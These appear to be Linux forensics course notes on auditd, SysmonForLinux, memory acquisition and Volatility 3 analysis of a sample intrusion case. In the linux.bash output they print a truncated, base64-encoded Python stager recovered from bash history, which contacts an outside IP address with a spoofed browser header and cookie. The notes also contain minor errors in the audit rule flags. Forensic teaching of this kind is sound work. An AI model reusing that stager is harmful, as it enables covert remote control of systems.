|Tool used to search|`aureport` and `ausearch` reads `audit.log` file|
|Recommended basic configuration file|[https://github.com/Neo23x0/auditd/blob/master/audit.rules](https://github.com/Neo23x0/auditd/blob/master/audit.rules)|

After installing it, enable the service with `sudo systemctl enable --now auditd`. For persistence across reboots, add rules to `/etc/audit/rules.d/` and reload with `sudo augenrules --load`. For forensics, check `/etc/audit/auditd.conf` for settings like log rotation to understand retention policies.

#### Audit Rules

Audit rules are configuration directives used by the Linux Auditing System to specify which system events, such as file operations, system calls, or user actions, should be monitored and logged by auditd. They are typically defined in files like `/etc/audit/audit.rules` or `/etc/audit/rules.d/` and loaded into the kernel. These are used for customizing the scope of auditing to focus on security-critical activities, such as watching specific files for modifications, tracking executable runs, or monitoring network operations, thereby supporting compliance, threat detection, and detailed event tracking without overwhelming the system with unnecessary logs.

There are 3 kinds of audit rules:

- Control rules - overall control of the audit system
- File System rules - audit access to files and directories
- Syscall - audit system calls

|Rule Type|Parameters|Description|
|---|---|---|
|Control rules|`-b`|sets the maximum amount of existing Audit buffers in the kernel|
|Control rules|`-f`|sets the action that is performed when a critical error is detected|
|Control rules|`-e`|enables and disables the Audit system or locks its configuration|
|Control rules|`-r`|sets the rate of generated messages per second|
|Control rules|`-s`|reports the status of the Audit system|
|Control rules|`-l`|lists all currently loaded Audit rules|
|Control rules|`-D`|deletes all currently loaded Audit rules|
|File System rules|`-r`|read access to a file or a directory.|
|File System rules|`-w`|write access to a file or a directory.|
|File System rules|`-x`|execute access to a file or a directory.|
|File System rules|`-a`|change in the file's or directory's attribute.|
|System call rules|`-a`|action and filter (action can be either always or never. filter specifies which kernel rule-matching filter is applied to the event. The rule-matching filter can be one of the following: task, exit, user, and exclude)|
|System call rules|`-S`|system call (list of system calls can be found in the `/usr/include/asm/unistd_64.h` file|
|System call rules|`-F exe=path_to_exe`|filters events where the executable matches the specified path|

Audit rules operate by being loaded into the kernel's audit subsystem either at boot or dynamically using the `auditctl` command. When an event matches a rule, it's sent to auditd for logging, with keys _`(-k)`_ for easy searching later. For example, you can detect modification and creation of new users using the following auditd rules:

| Modifications | Rules |
|---|---|
|User, group, password databases|`w /etc/group -p wa -k etcgroup`|
|User, group, password databases|`w /etc/passwd -p wa -k etcpasswd`|
|User, group, password databases|`w /etc/gshadow -k etcgroup`|
| User, group, password databases | `w /etc/shadow -k etcpasswd` |
| User, group, password databases | `w /etc/security/opasswd -k opasswd` |
| Sudoers file changes | `w /etc/sudoers -p wa -k actions` |
| Sudoers file changes | `w /etc/sudoers.d/ -p wa -k actions` |
| Passwd | `w /usr/bin/passwd -p x -k passwd_modification` |
| Tools to change group identifiers | `w /usr/sbin/groupadd -p x -k group_modification` |
| Tools to change group identifiers | `w /usr/sbin/groupmod -p x -k group_modification` |
| Tools to change group identifiers | `w /usr/sbin/addgroup -p x -k group_modification` |
| Tools to change group identifiers | `w /usr/sbin/useradd -p x -k user_modification` |
| Tools to change group identifiers | `w /usr/sbin/userdel -p x -k user_modification` |
| Tools to change group identifiers | `w /usr/sbin/usermod -p x -k user_modification` |
| Tools to change group identifiers | `w /usr/sbin/adduser -p x -k user_modification` |

Sudoers file modification might also be used for privesc.

#### aureport

The `aureport` utility generates summary reports from audit log files, aggregating data into readable formats like event counts or user activity summaries. By default, all `audit.log` files in the `/var/log/audit/` directory are queried to create the report. You can specify a different file to run the report against using the `aureport` options `-if file_name` command. Aureport works by processing the audit log file and using options to specify report types, such as `-a` for authentication, `-f` for files, or `-u` for users. It can filter by time, interpret data, and output in formats suitable for further analysis, drawing from hardcoded event categories to produce aggregated statistics like success/failure counts.

Example:

```bash
linuxforensics@ubuntu:~$ sudo aureport --input /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log --login

Login Report
============================================
# date time auid host term exe success event
============================================
1. 02/26/2025 15:00:01 1000 ? /dev/pts/0 /usr/sbin/sshd yes 7050
2. 02/26/2025 15:01:12 0 ? /dev/pts/1 /bin/bash no 5678
<SNIP>
```

#### ausearch

`ausearch` is used for investigating audit trails by searching logs for particular events, such as failed logins or file accesses, which is essential for security analysis, debugging, and reconstructing sequences of actions during incident response. by default, `ausearch` searches the `/var/log/audit/audit.log` file. You can specify a different file using the `ausearch` options `-if file_name` command. Supplying multiple options in one `ausearch` command is equivalent to using the AND operator between field types and the OR operator between multiple instances of the same field type.

Exmaple:

```bash
linuxforensics@ubuntu:~$ sudo ausearch -if /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log -m ADD_USER -m DEL_USER -m ADD_GROUP -m USER_CHAUTHTOK -m DEL_GROUP -m CHGRP_ID -m ROLE_ASSIGN -m ROLE_REMOVE -i

----
time->Wed Feb 26 15:02:23 2025
type=USER_CHAUTHTOK msg=audit(1234567890.123:456): pid=12345 uid=0 auid=1000 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:chauthtok acct="john" exe="/usr/bin/passwd" hostname=? addr=? terminal=pts/0 res=success'
<SNIP>
```

To list all `ausearch` options, you can use `man ausearch`. The full Auditd documentation can be found [here](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/security_hardening/auditing-the-system_security-hardening).

Audit logs are text-based but structured, with fields like `type=`, `msg=audit(timestamp:event_id:`, and key-value pairs. This format aids parsing; use scripts or tools like awk / grep for extraction. For advanced analysis, integrate with ELK Stack by forwarding logs via audispd plugins.

Extend monitoring with rules for network changes:

```bash
linuxforensics@ubuntu:~$ auditctl -a always,exit -F arch=b64 -S socket -k network_mod
```

In investigations, make logs immutable with `chattr +i /var/log/audit/audit.log` to prevent tampering. Correlate with journalctl or syslog for a fuller picture , e.g., match Auditd's syscall events with journal timestamps.

For example, to status check:

```bash
linuxforensics@ubuntu:~$ sudo auditctl -s

enabled 1
failure 1
pid 1234
rate_limit 0
backlog_limit 8192
lost 0
backlog 0
loginuid_immutable 0 unlocked
```

### SysmonForLinux

... is an open-source system monitoring tool developed by Microsoft as part of the Sysinternals suite. By leveraging  extended Berkely Packet Filter (_eBPF_) technology, SysmonForLinux efficiently monitors key events without significant performance overhead, making it adaptable for both standalone servers and large-scale deployments in cloud or enterprise settings.

In terms of operation, it's installed as a service and device driver that persists across reboots, ensuring continuous monitoring. Logs are primarily directed to `/var/log/syslog` by default, but can be configured to integrate with other logging systems like `system-journald` or forwarded to centralized SIEM platforms. Configuration is handled through XML files, where users define rules for event filtering, such as including or excluding specific processes, paths or behaviors, to focus on high-value activities while minimizing noise. For viewing logs, the included SysmonLogView utility parses and formats the output for better readability, allowing queries based on event types or keywords.

What makes SysmonForLinux a game-changer is its ability to complement native Linux tools like Auditd or Syslog by providing more granular, security-focused telemetry that traditional logging might miss. For example, in incident analysis, its logs can reveal anomalies such as unexpected process injections, suspicious registry-like changes in configuration files, or outbound connections to C2 servers, helping teams reconstruct attack chains and respond swiftly. Installation is straightforward via Microsoft's Linux repos for distros like Ubuntu, Red Hat, or Debian, with build options available for custom setups.

#### Overview

It uses eBPF programs to hook into kernel events, automatically discovering kernel offsets or relying on BPF Type Format (_BTF_) for precise tracing on supported systems. From an event-tracing perspective, eBPF allows you to write event-driven programs and have pre-defined hooks into operations such as system calls, network connections, and file write/read. You can find out how to automate the deployment of SysmonForLinux [here](https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/automating-the-deployment-of-sysmon-for-linux-and-azure-sentinel/ba-p/2847054).

![intro_linux_forensics3](../../../../images/intro_linux_forensics3.png)

Breakdown of key components:

|Component|Description|
|---|---|
|Underlying Technology|eBPF for event-driven kernel hooks|
|Log Location|`/var/log/syslog` (XML format)|
|Configuration|XML files (e.g., `sysmonconfig.xml`) for filtering events|
|Daemon|Sysmon (Installed as a service)|
|Parsing Tool|SysmonLogView for converting XML to human-readable format|
|Installation|Via Microsoft repositories or build from source on GitHub|

**Supported events**:

|Event ID|Description|
|---|---|
|`1`|Logs when a new process is created.|
|`3`|Logs TCP/UDP connections on the machine.|
|`4`|Logs the state of the Sysmon service (started or stopped).|
|`5`|Logs when a process terminates.|
|`9`|Logs when a process conducts reading operations, from the drive.|
|`11`|Logs when a file is created or overwritten.|
|`16`|Logs when the local Sysmon configuration is updated.|
|`23`|Logs when a file is deleted by a process.|

#### Installation and Configuration

To install SysmonForLinux, add Microsoft's repo for your Ubuntu distro:

```bash
cry0l1t3@ubuntu:~$ wget -qO- <https://packages.microsoft.com/keys/microsoft.asc> | sudo apt-key add - 
cry0l1t3@ubuntu:~$ sudo add-apt-repository "deb [arch=amd64] <https://packages.microsoft.com/ubuntu/$>(lsb_release -rs)/prod $(lsb_release -cs) main"
cry0l1t3@ubuntu:~$ sudo apt update && sudo apt install sysmonforlinux -y
cry0l1t3@ubuntu:~$ sudo sysmon -i sysmonconfig.xml   # <- Start with this command for a custom config, or without for defaults
```

Configuration uses XML files to filter events:

```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <ProcessCreate onmatch="exclude">
      <Image>/bin/ls</Image>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

You can update configs with:

```bash
linuxforensics@ubuntu:~$ sudo sysmon -c newconfig.xml
```

For forensics, use configs from repos like [SwiftOnSecurity's](https://github.com/SwiftOnSecurity/sysmon-config) to focus on high-value events.

#### SysmonLogView

... is designed to enhance the usability of Sysmon's logging output on Linux systems. It primarily serves to convert the XML-formatted event logs generated by Sysmon into a more human-readable, structured text format, making it easier for you to parse, analyze, and troubleshoot system activities without dealing with raw XML clutter. It works by reading syslog data from standard input and writing processes, filtered output to standard output, allowing easy integration into pipelines or scripts for real-time monitoring and/or batch processing.

```bash
linuxforensics@ubuntu:~$ sudo /opt/sysmon/sysmonLogView -h

SysmonLogView v1.0 - Converts Sysmon syslog XML to human readable form
Sysinternals - www.sysinternals.com
By Kevin Sheldrake
Copyright (C) 2021 Microsoft Corporation

Usage:
            sysmonLogView [<options>]
  -e   Only display events with matching eventID. Specify comma-separated list
       of eventIDs and/or multiple -e switches.
  -r   Only display events within the specified range of recordIDs. Specify
       min,max. If min is missing, start from the beginning; if end is missing,
       continue to end.
  -t   Only display events within the specified time stamps. Specify start,end.
       Time format is YYYY-MM-DD HH:MM[:SS[.nnn]] where nnn is milliseconds.
       If start is missing, start at beginning; if end is missing, continue to
       the end.
  -f   For events that have a particular field, only display events that match
       the given value (case sensitive). e.g. '-f Image=/bin/touch'
  -E   Only display the specified fields for the specified event. Specify
       <eventID>=<comma-separated list of fields>. Can use multiple times.
  -X   Print a blank link between events.
  -h   Display this help.
  -?   Display this help.

Supply input data on standard input; writes to standard output. By default all
events are displayed but switches can be used to only display certain events,
and to only display certain fields within the events that are displayed.

Wrap arguments in quotes (e.g. "<argument>") if argument contains spaces.

Typical usage:
  sudo tail -f /var/log/syslog | sudo /opt/sysmon/sysmonLogView
```

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/HacktiveLegion_15102023/ubuntu/var/log/syslog | sudo /opt/sysmon/sysmonLogView

UtcTime: 2023-10-15 18:00:01.234
ProcessGuid: {ff032593-1234-5678-90ab-cdef12345678}
ProcessId: 12345
Image: /bin/bash
CommandLine: bash script.sh
CurrentDirectory: /home/john
User: john
LogonGuid: {00000000-0000-0000-0000-000000000000}
LogonId: 1000
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=abcdef1234567890
ParentProcessGuid: {ff032593-8765-4321-09ba-fedcba987654}
ParentProcessId: 67890
ParentImage: /usr/sbin/sshd
ParentCommandLine: sshd: john [priv]
<SNIP>
```

#### Forensic Tip

In investigations, pipe logs to tools like `jq` for JSON-like parsing. Forward to a SIEM by configuring `rsyslog` to send Sysmon events. Rotate logs via `/etc/logrotate.d/syslog` to preserve history. However, you need to ensure eBPF supprts kernel 4.18+. You can test configs with `sysmon -? config`.

```bash
linuxforensics@ubuntu:~$ sudo tail -f /var/log/syslog | grep "EventID>1" | sudo /opt/sysmon/sysmonLogView -f EventID=1

Event SYSMONEVENT_CREATE_PROCESS
        RuleName: -
        UtcTime: 2025-11-03 15:20:20.326
        ProcessGuid: {7df8f1a8-c834-6908-fd04-c48d09560000}
        ProcessId: 5047
        Image: /usr/bin/sudo
        FileVersion: -
        Description: -
        Product: -
        Company: -
        OriginalFileName: -
        CommandLine: sudo /opt/sysmon/sysmonLogView
        CurrentDirectory: /home/linuxforensics
        User: root
        LogonGuid: {7df8f1a8-0000-0000-0000-000002000000}
        LogonId: 0
        TerminalSessionId: 6
        IntegrityLevel: no level
        Hashes: SHA256=7d3c2983ad2f278d9e799b5792f13f57bf890bd3b03d10b36e53bf0b6677895e
        ParentProcessGuid: {7df8f1a8-c73a-6908-0def-0fa03e560000}
        ParentProcessId: 5018
        ParentImage: /usr/bin/bash
        ParentCommandLine: bash
        ParentUser: root
<SNIP>
```

You can also pair SysmonForLinux with Auditd for more comprehensive coverage. SysmonForLinux excels in process/network events, while Auditd handles syscalls. Additionally, with SysmonLogView you can export the logs to CSV for analysis: `sysmonLogView -csv output.csv < syslog`.

### Linux Memory Image

Acquiring and analyzing memory images is a crucial technique for capturing volatile data that disappears on shutdown. This process snapshots the system's RAM, revealing active processes, network connections, and even hidden malware that disk-based analysis might miss.

#### Overview

Memory dumps can expose loaded modules, open files, and command histories that aren't persisted to disk, making them essential for volatile evidence preservation. To maximize the effectiveness of Volatility 3 during your analysis and investigations in real-world environments, you need to acquire memory dumps as early as possible to minimize volatility loss because the data in RAM can evaporate quickly due to system activity or power cycles.

You can use a variety of tools to acquire Linux memory:

- **Fmem**: this is a kernel module which creates a `/dev/fmem` device, that can be used for dumping physical memory, without limits of `/dev/mem`
- **LiME**: this is another Loadable Kernel Module (_LKM_) which is used to collect volatile memory images from Linux and Linux-based devices, such as Android
- **AVML**: AVML is an X86_64 userland volatile memory acquisition tool written in Rust, intended to be deployed as a static binary. AVML can be used to acquire memory without knowing the target OS distro or kernel a priori. No on-target compilation or fingerprinting is needed

```bash
d41y@htb[/htb]$ ./avml --help

A portable volatile memory acquisition tool

Usage: avml [OPTIONS] <FILENAME>

Arguments:
  <FILENAME>
          name of the file to write to on local system

Options:
      --compress
          compress via snappy

      --source <SOURCE>
          specify input source

          Possible values:
          - /dev/crash:  Provides a read-only view of physical memory.  Access to memory using this device must be paged aligned and read one page at a time
          - /dev/mem:    Provides a read-write view of physical memory, though AVML opens it in a read-only fashion.  Access to to memory using this device can be disabled using the kernel configuration options `CONFIG_STRICT_DEVMEM` or `CONFIG_IO_STRICT_DEVMEM`
          - /proc/kcore: Provides a virtual ELF coredump of kernel memory.  This can be used to access physical memory

      --max-disk-usage <MAX_DISK_USAGE>
          Specify the maximum estimated disk usage (in MB)

      --max-disk-usage-percentage <MAX_DISK_USAGE_PERCENTAGE>
          Specify the maximum estimated disk usage to stay under

      --url <URL>
          upload via HTTP PUT upon acquisition

      --delete
          delete upon successful upload

      --sas-url <SAS_URL>
          upload via Azure Blob Store upon acquisition

      --sas-block-size <SAS_BLOCK_SIZE>
          specify maximum block size in MiB

      --sas-block-concurrency <SAS_BLOCK_CONCURRENCY>
          specify blob upload concurrency

          [default: 10]

  -h, --help
          Print help (see a summary with '-h')

  -V, --version
          Print version
```

#### Preparing for Memory Acquisition

Before starting the acquisition process, ensure that the target system is isolated to prevent further changes to the memory state. This might involve disconnecting network cables or disabling wireless interfaces to avoid remote interference. Also, document the system's current state, including running processes via `ps aux` or network connections with `netstat -tuln`, as these can serve as baselines for later analysis. Remember, inserting any tool into the system can alter memory slightly, so choose tools that minimize footprint, like static binaries.

##### Memory Dump with AVML

The easiest tool to use is AVML, which doesn't require any compilation on the target system. To acquire a memory image, just run it with root permissions and provide the filename.

```bash
d41y@htb[/htb]$ sudo ./avml memdump.mem

Acquiring memory...
Progress: 100% (4.0 GB / 4.0 GB)
Memory acquisition complete. File saved as memdump.mem
```

##### Using LiME for Memory Dumps

For environments where kernel modules are acceptable, LiME offers flexible options for dumping memory over TCP or local files. First, compile the module on a similar system using `make`, then transfer the `.ko` file to the target. Load it with`insmod` and specify the output format.

```bash
d41y@htb[/htb]$ sudo insmod lime.ko "path=tcp:4444 format=lime"

# On the collection host:
d41y@htb[/htb]$ nc -l -p 4444 > memory.lime
```

This method is useful for remote acquisitions without writing to the target's disk, reducing the risk of overwriting evidence.

#### Considerations

Always verify the integrity of the acquired image using hashes like SHA-256 immediately after dumping to ensure no corruption occured during transfer. Store the dump on external media to avoid contaminating the target system. Be aware of legal implications in forensic scenarios, as the chain of custody must always be maintained. In virtualized environments, consider hypervisor-level dumps if possible for a cleaner snapshot.

### Volatility 3

... is an advanced, open-source memory forensics framework to extract and analyze digital artifacts from volatile memory dumps, supporting multiple OS, including Linux.

#### Setting Up Volatility 2 for Linux

If you have to get started with Volatility 3 on Linux memory dumps, first install the framework by cloning the repo from GitHub and installing dependencies via pip:

```bash
linuxforensics@ubuntu:~$ git clone https://github.com/volatilityfoundation/volatility3.git
linuxforensics@ubuntu:~$ pip install -r requirements.txt
```

For Linux-specific analysis, you'll need a memory dump file acquired from the target system. Volatility 3 requires symbol tables for the Linux kernel, which can be generated or downloaded. You can search for the full banner as shown in Volatility 3's `banners.Banners` plugin or check the kernel version using `uname -r`. To obtain the appropriate Linux symbols, visit the community-maintained repo at https://github.com/Abyss-W4tcher/volatility3-symbols, which provides pre-generated JSON symbol packs for various Linux kernel versions and distros.

Pre-built symbol tables are often available, but for custom kernels, use tools like `dwarfdump` to create them from kernel debug symbols and `System.map`. Place symbol tables in a directory and point Volatility to the using the `--symbol-dir` option if needed. You can run plugins with the command format `python3 vol.py -f <dumpfile> <plugin_name>`, ensuring the Python environment matches the framework's requirements. Test setup by running `python3 vol.py info` to list availabe plugins and automations.

#### Key Plugins

Once configured, Volatility 3 offers a suite of Linux-specific plugins to extract valuable forensic data from memory dumps. These plugins leverage the framework's ability to parse kernel structures like `task_struct` for processes or `inode` for cache files. Below is an expanded list of commonly used plugins, including those mentioned in the original description, with brief explanations, usage commands, and typical outputs:

|Plugin|Description|Command|
|---|---|---|
|`linux.pslist`|Lists all running processes by walking the kernel's task list, displaying details like PID, PPID, command name, and start time. Useful for identifying hidden or rogue processes.|`python3 vol.py -f memdump.mem linux.pslist`|
|`linux.bash`|Recovers command history from bash shells by scanning process memory for history structures, revealing executed commands even if logs were cleared.|`python3 vol.py -f memdump.mem linux.bash`|
|`linux.sockstat`|Lists all network connections for all processes, including sockets, protocols (TCP/UDP), local/remote addresses, and associated processes. Ideal for detecting unauthorized network activity or backdoors.|`python3 vol.py -f memdump.mem linux.sockstat`|
|`linux.psaux`|Lists processes with their command line arguments.|`python3 vol.py -f memdump.mem linux.psaux`|
|`linux.pstree`|Displays the process tree, showing parent-child relationships to visualize process hierarchies and spot anomalies like orphaned processes.|`python3 vol.py -f memdump.mem linux.pstree`|
|`linux.lsmod`|Lists loaded kernel modules, helping detect rootkits or malicious drivers injected into the kernel.|`python3 vol.py -f memdump.mem linux.lsmod`|
|`linux.lsof`|Shows open files for each process, including file descriptors, types (e.g., regular files, sockets), and paths, useful for tracking file access during incidents.|`python3 vol.py -f memdump.mem linux.lsof`|
|`linux.envvars`|Extracts environment variables from processes, which can reveal configuration details, paths, or sensitive data like API keys.|`python3 vol.py -f memdump.mem linux.envvars`|
|`linux.malfind`|Scans process memory for suspicious code injections or hidden malware by detecting regions with executable permissions but no mapped files.|`python3 vol.py -f memdump.mem linux.malfind`|
|`linux.check_syscall`|Verifies the integrity of system call tables to detect hooks or modifications by rootkits.|`python3 vol.py -f memdump.mem linux.check_syscall`|
|`linux.elfs`|Lists all memory mapped ELF files for all processes.|`python3 vol.py -f memdump.mem linux.elfs`|
|`linux.mountinfo`|Lists mount points on processes mount namespaces.|`python3 vol.py -f memdump.mem linux.mountinfo`|
|`linux.proc`|Lists all memory maps for all processes.|`python3 vol.py -f memdump.mem linux.proc`|

Additional plugins like `linux.ifconfig`, `linux.mount_cache`, and `linux.pidhashtable` provide deeper insights into system state. You can chain plugins or use automations for comprehensive analysis, such as combining `linux.pslist` with `linux.malfind` to investigate suspicious processes.

#### Memory Analysis

One the memory image is successfully acquired, the next step is memory analysis. This is where tools like Volatility come into play. Volatility is an open-source memory forensics framework that provides a wealth of capabilities for analyzing memory dumps. The only difference between Linux and Windows memory analysis is that for Linux you need to create a custom profile or symbol table.

First you need to determine the kernel version of the system where the memory image was acquired. You can use volatility module banners.

```bash
linuxforensics@ubuntu:~$ cd /tools/volatility3
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem banners.Banners

Volatility 3 Framework 2.5.2

Offset  Banner

0x60dd97e0      Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #93~20.04.1-Ubuntu SMP Wed Sep 6 16:15:40 UTC 2023
<SNIP>
```

Take a look at another example and use the `linux.pslist` plugin on a sample memory dump:

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.pslist

Volatility 3.0.0-beta.1    linux     pslist.PsList       Linux processes
Offset             PID     PPID    COMM            Threads  Handles  Start Time
0xffff888001234000 1       0       systemd         15       -        2023-10-15 10:00:01.000000
0xffff888004567000 123     1       sshd            3        -        2023-10-15 18:00:05.000000
0xffff888007890000 456     123     bash            1        -        2023-10-15 18:05:10.000000
<SNIP>
```

This output shows process details, which can be piped to tools like `grep` for filtering. For verbose output, add options like `--pid <PID>` to target specific processes.

To generate your own symbol table, follow the next steps:

1. Install [dwarf2json](https://github.com/volatilityfoundation/dwarf2json)
2. Collect system version either through Volatility 3 banners or `uname -r`
3. To install debug symbols you need to enable dbgsym repos first

```bash
linuxforensics@ubuntu:~$ echo "deb <http://ddebs.ubuntu.com> $(lsb_release -cs) main restricted universe multiverse \
deb <http://ddebs.ubuntu.com> $(lsb_release -cs)-updates main restricted universe multiverse \
deb <http://ddebs.ubuntu.com> $(lsb_release -cs)-proposed main restricted universe multiverse" | sudo tee -a /etc/apt/sources.list.d/ddebs.list

linuxforensics@ubuntu:~$ sudo apt install ubuntu-dbgsym-keyring
cry0l1t3@ubuntu:~$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622
cry0l1t3@ubuntu:~$ sudo apt-get update
```

4. Now you can install dbgsym for the desired kernel image version

```bash
linuxforensics@ubuntu:~$ sudo apt install linux-image-5.15.0-84-generic-dbgsym
```

The vmlinux file containing kernel debug symbols is located in the `/usr/lib/debug/boot` directory.

5. Generate Intermediate Symbole File (_ISF_) JSON for kernel debug symbols. Processing large DWARF files requires a minimum of 8GB RAM, so you may need to add more swap space if you don't have enough RAM

```bash
linuxforensics@ubuntu:~$ ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.15.0-84-generic > ubuntu64-5.15.0-84-generic.json
```

6. Copy the generated JSON file to the Volatility 3 symbols folder.

```bash
linuxforensics@ubuntu:~$ cp ubuntu64-5.15.0-84-generic.json /home/linuxforensics/volatility3/volatility3/symbols/
```

Now you are able to analyze your memory image with Volatility 3.

##### linux.psaux

Lists processes with their command line arguments.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.psaux

Volatility 3 Framework 2.5.2

PID     PPID    COMM    ARGS

1       0       systemd /sbin/init auto noprompt
2       0       kthreadd        [kthreadd]
3       2       rcu_gp  [rcu_gp]
4       2       rcu_par_gp      [rcu_par_gp]
5       2       slub_flushwq    [slub_flushwq]
6       2       netns   [netns]
8       2       kworker/0:0H    [kworker/0:0H]
10      2       mm_percpu_wq    [mm_percpu_wq]
11      2       rcu_tasks_rude_ [rcu_tasks_rude_]
12      2       rcu_tasks_trace [rcu_tasks_trace]
13      2       ksoftirqd/0     [ksoftirqd/0]
14      2       rcu_sched       [rcu_sched]
15      2       migration/0     [migration/0]
<SNIP>
```

##### linux.bash

Recovers bash command history from memory.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.bash

Volatility 3 Framework 2.5.2

PID     Process CommandTime     Command

4606    bash    2023-10-15 17:50:53.000000      LESSCLOSE
4606    bash    2023-10-15 17:50:53.000000      echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8zLjIxMi4xOTcuMTY2OjgwJzt0PScvbG9naW4vcHJvY2Vzcy5waHAnOwpyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXVxRklJaytQTnhRL3NlQmxjL3dJclhwVzNRbz0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7Ck
4606    bash    2023-10-15 17:50:53.000000      exit
4606    bash    2023-10-15 17:50:53.000000      sudo su
4606    bash    2023-10-15 17:51:01.000000      cd tools/
4606    bash    2023-10-15 17:51:08.000000      sudo ./avml memdump.mem
4606    bash    2023-10-15 17:51:08.000000
```

##### linux.elfs

Lists all memory mapped ELF files for all processes. You can also dump those files with `--dump` option.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.elfs

Volatility 3 Framework 2.5.2

PID     Process Start   End     File Path       File Output

1       systemd 0x5612e9fbe000  0x5612e9ff0000  /usr/lib/systemd/systemd        Disabled
1       systemd 0x7fd3aa730000  0x7fd3aa73d000  /usr/lib/x86_64-linux-gnu/libm-2.31.so  Disabled
1       systemd 0x7fd3aae62000  0x7fd3aae64000  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0    Disabled
1       systemd 0x7fd3aae72000  0x7fd3aae74000  /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.9.0   Disabled
1       systemd 0x7fd3ab1fc000  0x7fd3ab1ff000  /usr/lib/x86_64-linux-gnu/libaudit.so.1.0.0     Disabled
1       systemd 0x7fd3ab228000  0x7fd3ab22b000  /usr/lib/x86_64-linux-gnu/libpam.so.0.84.2      Disabled
1       systemd 0x7fd3ab29c000  0x7fd3ab2a2000  /usr/lib/x86_64-linux-gnu/libselinux.so.1       Disabled
1       systemd 0x7fd3ab2c7000  0x7fd3ab2c9000  /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1   Disabled
1       systemd 0x7fd3ab2e9000  0x7fd3ab2eb000  /usr/lib/x86_64-linux-gnu/librt-2.31.so Disabled
1       systemd 0x7fd3ab54f000  0x7fd3ab571000  /usr/lib/x86_64-linux-gnu/libc-2.31.so  Disabled
1       systemd 0x7ffecd0e0000  0x7ffecd0e2000  [vdso]  Disabled
359     systemd-journal 0x7f1b61590000  0x7f1b61592000  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0    Disabled
359     systemd-journal 0x7f1b61598000  0x7f1b615a5000  /usr/lib/x86_64-linux-gnu/libm-2.31.so  Disabled
<SNIP>
```

##### linux.envvars

Lists processes with their environment variables.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.envvars

Volatility 3 Framework 2.5.2

PID     PPID    COMM    KEY     VALUE

1       0       systemd find_preseed    /preseed.cfg
1       0       systemd HOME    /
1       0       systemd init    /sbin/init
1       0       systemd NETWORK_SKIP_ENSLAVED
1       0       systemd locale  en_US
1       0       systemd TERM    linux
1       0       systemd BOOT_IMAGE      /boot/vmlinuz-5.15.0-84-generic
1       0       systemd drop_caps
1       0       systemd PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
1       0       systemd PWD     /
1       0       systemd rootmnt /root
1       0       systemd priority        critical
359     1       systemd-journal LANG    en_US.UTF-8
359     1       systemd-journal PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
359     1       systemd-journal NOTIFY_SOCKET   /run/systemd/notify
359     1       systemd-journal LISTEN_PID      359
359     1       systemd-journal LISTEN_FDS      4
